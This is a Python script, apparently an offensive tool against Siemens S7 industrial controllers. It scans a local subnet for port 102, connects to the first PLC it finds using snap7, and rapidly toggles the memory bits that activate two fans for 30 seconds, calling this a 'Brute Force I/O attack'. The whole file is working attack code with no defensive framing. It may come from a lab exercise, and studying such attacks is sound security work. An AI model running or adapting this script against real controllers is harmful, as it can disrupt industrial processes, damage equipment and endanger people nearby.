import snap7
from snap7.util import set_bool, get_bool
import nmap
import time

# Define PLC-related process control memory addresses
ACTIVATE_FAN_A_ADDR = 0     # %M0.0
ACTIVATE_FAN_B_ADDR = 1     # %M0.1
MEMORY_BYTE = 0             # Memory bit area starts at DB0

# Function to scan for the Siemens PLC on the network
def find_plc_ip():
    nm = nmap.PortScanner()
    print("[+] Scanning network for Siemens PLC...")
    nm.scan(hosts="192.168.1.0/24", arguments="-p 102 --open")

    for host in nm.all_hosts():
        if nm[host]['tcp'][102]['state'] == 'open':
            print(f"[+] Siemens PLC found at IP: {host}")
            return host
    print("[-] No reachable Siemens PLC found. Exiting.")
    exit()

# Function to create a connection to the PLC
def connect_to_plc(ip):
    plc = snap7.client.Client()
    plc.connect(ip, 0, 1)  # Rack 0, Slot 1 (default for S7-1200)
    if plc.get_connected():
        print(f"[+] Successfully connected to PLC at {ip}")
    return plc

# Function for brute force attack: repeatedly toggle Fan A and Fan B activation bits
def brute_force_io(plc, duration=30):
    start_time = time.time()
    
    while (time.time() - start_time) < duration:
        # Read current memory state
        memory_area = plc.read_area(snap7.types.Areas.MK, MEMORY_BYTE, 0, 1)  # Read %M memory byte
        
        # Toggle values of `Activate_Fan_A` (%M0.0) and `Activate_Fan_B` (%M0.1)
        new_fan_a_state = not get_bool(memory_area, 0, ACTIVATE_FAN_A_ADDR)  # Invert current state
        new_fan_b_state = not get_bool(memory_area, 0, ACTIVATE_FAN_B_ADDR)  # Invert current state
        
        # Set new toggled states
        set_bool(memory_area, 0, ACTIVATE_FAN_A_ADDR, new_fan_a_state)
        set_bool(memory_area, 0, ACTIVATE_FAN_B_ADDR, new_fan_b_state)
        
        # Write manipulated data back to PLC
        plc.write_area(snap7.types.Areas.MK, MEMORY_BYTE, 0, memory_area)
        
        print(f"[!] Toggled Fan A: {new_fan_a_state}, Fan B: {new_fan_b_state}")
        time.sleep(0.2)  # Small delay to rapidly brute-force I/O changes

# Main execution
def main():
    plc_ip = find_plc_ip()
    plc = connect_to_plc(plc_ip)
    
    print("[+] Starting Brute Force I/O attack on Fan A and Fan B...")
    brute_force_io(plc)

    print("[+] Attack Complete. Disconnecting...")
    plc.disconnect()

if __name__ == "__main__":
    main()